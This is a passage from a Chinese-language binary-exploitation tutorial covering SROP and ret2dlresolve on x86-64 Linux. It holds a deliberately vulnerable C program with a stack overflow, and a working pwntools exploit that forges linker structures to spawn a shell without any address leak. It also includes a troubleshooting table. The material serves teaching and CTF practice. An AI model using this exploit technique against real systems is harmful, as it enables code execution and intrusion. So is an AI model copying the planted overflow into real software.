> System V AMD64 ABI 的返回值走 rax，`read` 返回"实际读到的字节数"——==read 返回的那一刻 rax 就等于输入长度==。把溢出 payload 恰好凑成 15 字节，vuln 尾声的 ret 弹出 `syscall` 的地址时，rax 已经是 15，连 pop rax 都省了。这条技巧与迁移、frame 的组合方式同本节，只是链更短。

> [!info]- 内核为什么不做校验
> 信号现场由内核铺设，"返回时按栈上的 frame 恢复"是它自己的协议；x86-64 的实现里 frame 没有魔数、没有校验和，`rt_sigreturn` 直接把 rsp-8 起的结构当作可信现场读入。x86-32 的 frame 开头有一段标记值会被核对，攻击构造多一步"伪造魔数"——位宽不同，协议细节不同，思路一致。

## 6. ret2dlresolve

### 6.1 伪造解析：让链接器替攻击者查符号

[[P03-ELF链接与延迟绑定#2.2 第一次调用的完整路径|P3 2.2]]走过延迟绑定的完整路径：首次调用经 PLT 表项 `push 下标`、PLT0 `push link_map` 进 `_dl_runtime_resolve`，解析器拿"link_map + 下标"在 `.rela.plt` 里定位条目，查出真实地址写回 GOT。整个过程里，==解析器对下标不做任何边界检查==——下标多大都照算：

$$\text{伪 Rela 地址} = \text{jmprel} + \text{下标} \times 24 \tag{8.1}$$

（24 是 Elf64_Rela 的字节数；jmprel 即 `.rela.plt` 的地址。）把下标选得足够大，"表项"就落到攻击者可写的内存里——通常是把伪造的 Rela/Sym 连同字符串一起 read 进 .bss（第 3、5 节的同款两段式）。解析器逐字读这份伪造结构：`r_offset` 指定解析结果写到哪，`r_info` 的高 32 位给出符号下标，符号的 `st_name` 再指向攻击者自带的 `"system"` 字符串——按名查找照常执行，查到的真实地址写进 `r_offset` 并跳过去。==没有泄露、没有 libc 基址，却完成了一次"解析并调用任意符号"==。

64 位还有一道版本检查：二进制带 `.gnu.version` 时，解析器会取 `vernum[符号下标]` 作版本下标。这个大下标对应的读点必须落在已映射内存、且值读到 0（0 表示"不做版本校验"），否则解析当场出错。落点位置由 data 的摆放地址决定——这是 64 位 ret2dlresolve 对环境要求严格的根源，也是工具替人算的部分。

### 6.2 实战：pwntools 的 Ret2dlresolvePayload

伪造结构的每个字段（下标换算、字段偏移、版本下标落点）都适合交给 pwntools 的 `Ret2dlresolvePayload` 自动生成（[[P05-pwntools与GDB插件工具链|P5]]的 pwntools 套件）。演示程序 partial RELRO + no PIE，两段输入，`pop rdi; ret` 由内联汇编自备：

```c
/* dl.c —— ret2dlresolve 演示程序（x86-64 Linux，Partial RELRO + no PIE） */
#include <unistd.h>

char data[0x400];   /* 伪造的解析结构落在这里 */

/* 演示程序小，pop rdi ; ret 用内联汇编自备一段 */
__asm__(
    ".text\n"
    ".globl pop_rdi\n"
    "pop_rdi:\n"
    "    pop %rdi\n"
    "    ret\n"
);

void vuln(void) {
    char buf[16];
    read(0, data, 0x300);   /* 伪造的 Rela / Sym / 字符串先进 .bss */
    read(0, buf, 0x80);     /* 溢出：摆触发链 */
}

int main(void) {
    write(1, "go\n", 3);
    vuln();
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -fno-stack-protector dl.c -o dl
pwn checksec dl | grep -E "RELRO|PIE"
```

输出：

```
    RELRO:      Partial RELRO
    PIE:        No PIE (0x400000)
```

工具把全部结构算出来（关键表的位置可以用 `readelf -r dl` 对照——`readelf` 输出的读法 [[P03-ELF链接与延迟绑定|P3]]2.1 讲过）：

```python
#!/usr/bin/env python3
# dl_probe.py —— 查看 Ret2dlresolvePayload 生成的结构与下标
from pwn import *
context.binary = elf = ELF('./dl', checksec=False)
context.log_level = 'error'

dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'],
                          data_addr=elf.symbols['data'])
print('jmprel     =', hex(elf.dynamic_value_by_tag('DT_JMPREL')))
print('reloc_index=', dl.reloc_index)
print('data_addr  =', hex(dl.data_addr))
print('resolution =', hex(dl.resolution_addr))
print('real_args  =', [hex(a) for a in dl.real_args])
print('payload len=', len(dl.payload))
```

输出：

```
jmprel     = 0x4004e0
reloc_index= 636
data_addr  = 0x404040
resolution = 0x404040
real_args  = ['0x404098']
payload len= 96
```

96 字节的 payload 从 `data` 起点铺开，各结构的位置与 8.1 对照：

| bss 地址 | 内容 |
| ---- | ---- |
| 0x404040 | `"system\0"`（也是 `r_offset`：解析结果写回这里） |
| 0x404058 | 伪造 Elf64_Sym：`st_name = 0x3c18`（相对 .dynstr 的偏移，恰好指回 0x404040） |
| 0x404080 | 伪造 Elf64_Rela：`r_offset = 0x404040`，`r_info` 的符号下标 = 647、类型 = 7（JUMP_SLOT） |
| 0x404098 | `"/bin/sh\0"`（触发链里送进 rdi 的参数） |

伪造 Rela 的地址 = jmprel + 636 × 24 = 0x4004e0 + 0x3ba0 = 0x404080，与 8.1 一致；下标 636 远超 `.rela.plt` 真实的 2 条表项，解析器照算不误。符号下标 647 对应的版本读点落在只读段末尾的补零区，读到 0，版本检查通过。

触发链复用 6.1 的流程认识：`pop rdi` 装好参数后，ret 落进 **PLT0**（`.plt` 表头，0x401020），此刻 rsp 正指着下一格——工具算好的伪造下标。PLT0 压入 link_map 后跳进解析器，"下标"已在栈上：

```python
#!/usr/bin/env python3
# exp_dl.py —— ret2dlresolve：伪造 Rela/Sym 让 _dl_runtime_resolve 解析出 system
from pwn import *
import time

context.binary = elf = ELF('./dl', checksec=False)
context.log_level = 'info'

POP_RDI = 0x401156      # ROPgadget 搜到的 pop rdi ; ret（以自己的产物为准）
PLT0    = elf.get_section_by_name('.plt').header.sh_addr

dl = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'],
                          data_addr=elf.symbols['data'])
print('reloc_index =', dl.reloc_index)

stage1 = dl.payload                               # 伪造结构，写进 .bss
stage2 = flat({
    0x00: b'A' * 24,                              # 填 buf 与 saved rbp
    0x18: p64(POP_RDI),                           # rdi = "/bin/sh"
    0x20: p64(dl.real_args[0]),
    0x28: p64(PLT0),                              # ret 落进 PLT0，rsp 正指着下一格
    0x30: p64(dl.reloc_index),                    # PLT0 眼里"已被压栈"的伪造下标
    0x38: p64(0xdeadbeef),                        # 解析完成后，这格是 system 的返回地址
}, filler=b'B')

io = process('./dl')
io.recvuntil(b'go\n')
io.send(stage1)
time.sleep(0.3)
io.send(stage2)
time.sleep(0.5)
io.sendline(b'echo DL_SHELL_OK')
print(io.recvline(timeout=5).decode().strip())
io.close()
```

```bash
python3 exp_dl.py
```

输出：

```
reloc_index = 636
[x] Starting local process './dl'
[+] Starting local process './dl': pid 3988
DL_SHELL_OK
[*] Stopped process './dl' (pid 3988)
```

shell 到手——程序从头到尾没泄露过任何地址，`system` 是链接器按攻击者的伪造结构解析出来的。

> [!warning] 构造 payload 前先设 context
> `Ret2dlresolvePayload` 按当前 context 的位宽选结构体：64 位程序配 64 位的 Elf64_Rela（24 字节），下标换算才正确。脚本开头不设 `context.binary`（或 `context.arch`），pwntools 按默认的 32 位计算，6.2 的下标会得出完全错误的值，且不报错。`context.binary = elf = ELF(...)` 一行设全（[[P05-pwntools与GDB插件工具链|P5]]第 4 节）。

> [!note] 为什么 full RELRO 下此路不通
> full RELRO 的 BIND_NOW 在启动时就解析完所有函数、把 GOT 锁成只读（[[P04-Linux安全缓解机制|P4]]；两级 RELRO 的对比在 [[P03-ELF链接与延迟绑定#3. RELRO：GOT 什么时候变只读|P3 第 3 节]]）——不再有任何代码需要走进 PLT0，"带伪造下标进解析器"这条入口根本不存在。checksec 报 Full RELRO 时，泄露加 ROP（[[P07-ret2libc-ret2syscall-ret2shellcode|P7]]）或 SROP 才是可选的路。

> [!info]- 32 位是同一套思想的鼻祖
> 32 位 ELF 的 Elf32_Rel 只有 8 字节，老版 glibc 的 PLT 压栈参数按字节偏移解释，伪结构离 `.rela.plt` 远时偏移还能对 $2^{32}$ 取模回绕——这是"重定位下标溢出"这个词的出处。字段更小、换算更绕，但整条链的骨架与 6.1 完全同源。位宽差异全部由 `Ret2dlresolvePayload` 处理，做题时以工具生成的下标为准。

## 7. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| 迁移后崩在链的第一条之前，GDB 里 rsp 没到 bss | 假 rbp 没写对，或 `leave; ret` gadget 地址不对：断点下在 gadget 上看两次命中时 rbp 的值（3.3 的现场） |
| 迁移成功但链头被执行成怪指令 | 忘了链头一格会被第二次 leave pop 进 rbp：链从第二格开始排（3.2 的表） |
| 迁移后 system 报解析错误或直接崩 | 落点下方空间不够，`_dl_runtime_resolve` 的现场压坏了链或 GOT：落点往 bss 深处挪，字符串留在 rsp 上方（3.3 折叠框） |
| 两段输入的第二段"消失"了 | 两次 read 共享一条管道，第二段被第一次 read 吞掉：`send` 之间 `sleep`，或程序加提示符用 `recvuntil` 同步（3.3 的 warning） |
| csu 片段调用执行了但毫无输出、返回 -9 | 片段的参数顺序与函数签名不一致，rdi/rsi 装反：逐条反汇编片段，对着签名核（4.4 的 warning） |
| csu 片段调用了目标函数之后又开始循环调用 | 片段尾部的回环判断没退出：rbx 与 r15 装同一个值，让 `cmp` 首次命中（4.4） |
| SROP 触发后寄存器恢复成随机值当场崩 | syscall 执行那一刻 rsp 没有正好指着 frame：数清链上还剩几槽，frame 必须紧跟在触发它的 syscall 槽之后（5.2 的表） |
| SROP 恢复后崩在 frame.rip | frame.rip 必须是 syscall 指令本身，不是函数地址；frame.rsp 必须是有效可写地址（5.3） |
| dlresolve 崩在解析器里，dmesg 显示读未映射地址 | 版本下标落点没落在已映射内存：换 `data_addr`，让 `vernum[符号下标]` 落进已映射且读到 0 的区域（6.1） |
| dlresolve 解析出了错误符号 | `st_name` 是相对 .dynstr 的偏移，手拼结构极容易算错：交给 `Ret2dlresolvePayload`（6.2） |
| `Ret2dlresolvePayload` 算出的下标大得离谱 | 构造前没设 context，pwntools 按 32 位结构计算：先 `context.binary = elf = ELF(...)`（6.2 的 warning） |
| 本章技术在 PIE 程序上地址全错 | 没有失效，只是地址要加运行期基址：先拿基址泄露再平移（[[P04-Linux安全缓解机制\|P4]] 的 PIE 一节） |

